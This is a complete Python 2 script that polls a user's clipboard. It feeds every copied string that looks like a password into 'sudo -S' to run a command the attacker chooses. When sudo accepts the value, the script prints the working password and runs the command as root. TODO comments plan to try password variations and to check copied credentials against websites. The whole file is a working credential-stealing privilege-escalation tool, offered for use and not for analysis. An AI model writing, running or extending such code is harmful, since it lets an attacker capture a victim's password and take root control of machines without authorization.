import subprocess
import clipboard
import argparse
import sys

# TODO: Add option to add emails/usernames and ability to check various websites

def is_password(s):
    # Returns if s may be a password

    # Most passwords don't have spaces
    if ' ' in s:
        return False

    # Passwords aren't multiline
    if '\n' in s:
        return False

    return True

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--command', help='command to run if root password is copied', required=True)
    args = parser.parse_args()
    command = args.command

    print "Trying to run %s" % command

    p = subprocess.Popen("sudo -S echo TESTVAL", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    if "TESTVAL" in out:
        print "Already can sudo, running command"
        p = subprocess.Popen("sudo -S %s" % command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
        print out
        print err
        sys.exit(0)
    
    last_val = ''
    while True:
        val = clipboard.paste()
        if val != last_val:
            if is_password(val):
                # TODO: Check variations (caps, numbers, etc) of the current value in case password is variation of copied password
                try:
                    p = subprocess.Popen("sudo -S %s" % command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    out, err = p.communicate(input='%s\n'%val)
                    if "incorrect password" in err:
                        pass
                    else:
                        print "Sudo'd command executed\n=============================="
                        print "Working password:\n%s" % val
                        print 'stdout:'
                        print out
                        print 'stderr:'
                        print err
                        sys.exit(0)
                except subprocess.CalledProcessError:
                    pass
            last_val = val
        

if __name__ == '__main__':
    main()
